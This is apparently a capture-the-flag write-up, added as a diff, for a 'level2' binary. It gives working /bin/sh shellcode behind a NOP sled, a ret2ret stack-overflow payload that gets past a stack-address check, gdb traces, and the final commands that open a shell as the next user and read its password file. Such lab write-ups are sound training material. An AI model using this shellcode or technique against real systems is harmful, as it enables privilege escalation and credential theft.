@@ -1,0 +1,80 @@
+We notice a comparison in gdb in function p :
+
+0x080484fb <+39>:	and    $0xb0000000,%eax
+0x08048500 <+44>:	cmp    $0xb0000000,%eax
+
+If the address we try to overwrite starts with 0xbf, the program will quit.
+To counter this, we will first store a NOP sled followed by a shellcode that runs /bin/sh as an environement variable.
+
+NOP sled definition :
+
+Stack randomization and other runtime differences may make the address where the program will jump impossible to predict, so the attacker places a NOP sled in a big range of memory. 
+If the program jumps to anywhere into the sled, it will run all the remaining NOPs, doing nothing, and then will run the payload code, just next to the sled.
+
+export SHELLCODE=`python -c 'print "\x90" * 250 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'`
+
+We can see our new environement variable in gdb by looking at the stack:
+x/500x $esp
+
+0xbffff7a8:	0x45444f43	0x9090903d	0x90909090	0x90909090
+0xbffff7b8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff7c8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff7d8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff7e8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff7f8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff808:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff818:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff828:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff838:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff848:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff858:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff868:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff878:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff888:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff898:	0x90909090	0x90909090	0x90909090	0x31909090
+0xbffff8a8:	0x2f6850c0	0x6868732f	0x6e69622f	0xc931e389
+
+The solution is then to use a ret2ret exploit at the return instruction of the p function :
+=> 0x0804853e <+106>:	ret
+
+Let's create the payload :
+
+python -c "print 'A' * 80 + '\x3e\x85\x04\x08'  + '\x18\xf8\xff\xbf'" > /tmp/payload
+
+Where :
+
+'\x3e\x85\x04\x08' is the address of the return instruction in the p function.
+'\x18\xf8\xff\xbf' is an address pointing in the NOP sled before our shellcode.
+
+
+Let's check quickly through gdb :
+
+b * 0x0804853e
+r < /tmp/payload
+x/3wx $esp
+0xbffff5ac:	0x0804853e	0xbffff818	0x00000000
+i r
+eip 0x804853e
+
+As shown above :
+The stack will then run the return instruction again which will then allow us to insert our shellcode in eip.
+
+Running the binary in gdb with a normal behavior with a string like "blablbdfdfgfdgdfg" gives us :
+b * 0x0804853e
+r < /tmp/test
+Starting program: /home/user/level2/level2 < /tmp/test
+blablbdfdfgfdgdfg
+Breakpoint 1, 0x0804853e in p () => 0x0804853e <+106>:	ret
+x/3wx $esp
+0xbffff5ac:	0x0804854a	0x08048550	0x00000000
+Where 0x0804854a is : =>  0x0804854a <+11>:	leave in the main function.
+
+Which simply shows how the stack would behave normally.
+If we tried inserting the payload without the return instruction address first, the program would exit because of the cmp instruction. 
+
+Finally :
+
+cat /tmp/payload - | ./level2
+whoami
+level3
+cat /home/user/level3/.pass
